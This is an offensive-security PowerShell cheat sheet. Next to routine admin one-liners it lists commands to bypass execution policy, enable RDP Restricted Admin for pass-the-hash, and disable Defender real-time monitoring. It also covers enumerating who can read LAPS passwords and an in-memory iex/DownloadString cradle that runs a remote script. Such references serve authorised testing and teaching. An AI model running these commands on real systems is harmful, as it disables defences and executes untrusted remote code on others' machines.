# Powershell

## PowerShell oneliner

### Bypass execution policy

Loosen execution policy at the user scope so unsigned scripts run without prompts.

```sh title:"Loosen execution policy at user scope, no prompts"
Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted -Force;
```
<!-- cheat -->

### Enable RDP Restricted Admin

Flip the registry bit that allows RDP Restricted Admin (lets PtH reach RDP without sending a password).

```sh title:"Allow RDP Restricted Admin (PtH-style RDP login)"
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```
<!-- cheat -->

### Disable Defender RTP

Disable Defender real-time monitoring. Requires admin and Tamper Protection disabled.

```sh title:"Disable Defender RTP (needs admin, no Tamper Protection)"
Set-MpPreference -DisableRealTimeMonitoring $true
```
<!-- cheat -->

### Defender status

Query Defender status: signature age, RTP state, AMSI state.

```sh title:"Read Defender status, signature age, RTP/AMSI state"
Get-MpComputerStatus
```
<!-- cheat -->

### Install RSAT-AD (Server)

Install the AD PowerShell module on a Windows Server.

```sh title:"Install AD PowerShell module on Windows Server"
Install-WindowsFeature RSAT-AD-PowerShell
```
<!-- cheat -->

### Install RSAT (Desktop)

Install all RSAT capabilities on a Windows desktop SKU (Win10/11).

```sh title:"Install all RSAT capabilities on Windows desktop"
Get-WindowsCapability -Name RSAT* -Online | Add-WindowsCapability -Online
```
<!-- cheat -->

### Import AD module

Load the AD module into the current session so Get-ADUser etc. resolve.

```sh title:"Load AD module so Get-AD* resolves"
Import-Module ActiveDirectory
```
<!-- cheat -->

### AppLocker policy

Pull the effective AppLocker rules. Read this before dropping binaries on locked-down hosts.

```sh title:"Effective AppLocker rules, read before dropping bins"
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```
<!-- cheat -->

### LAPS delegated groups

Identify groups delegated to read LAPS passwords. From the LAPS PowerShell module.

```sh title:"Groups delegated to read LAPS passwords"
Find-LAPSDelegatedGroups
```
<!-- cheat -->

### LAPS extended rights

Find principals with extended rights to read LAPS-managed `ms-Mcs-AdmPwd`.

```sh title:"Principals with extended rights to read ms-Mcs-AdmPwd"
Find-AdmPwdExtendedRights
```
<!-- cheat -->

### LAPS-enabled computers

List computer objects that have a LAPS password set.

```sh title:"List computer objects with LAPS password set"
Get-LAPSComputers
```
<!-- cheat -->

### List loaded modules

Show every PowerShell module currently loaded in the session.

```sh title:"Loaded PowerShell modules in current session"
Get-Module
```
<!-- cheat -->

### Show execution policy

Show effective execution policy for every scope.

```sh title:"Show execution policy for every scope"
Get-ExecutionPolicy -List
```
<!-- cheat -->

### Per-process bypass

Bypass execution policy for the current process only (most reversible setting).

```sh title:"Bypass execution policy for current process only"
Set-ExecutionPolicy Bypass -Scope Process
```
<!-- cheat -->

### Inline script from URL

Classic in-memory script loader: download a remote `.ps1` and pipe straight into Invoke-Expression.

```sh title:"In-memory download + Invoke-Expression of remote .ps1"
iex(New-Object Net.WebClient).DownloadString('$URL')
```
<!-- cheat
var URL
-->
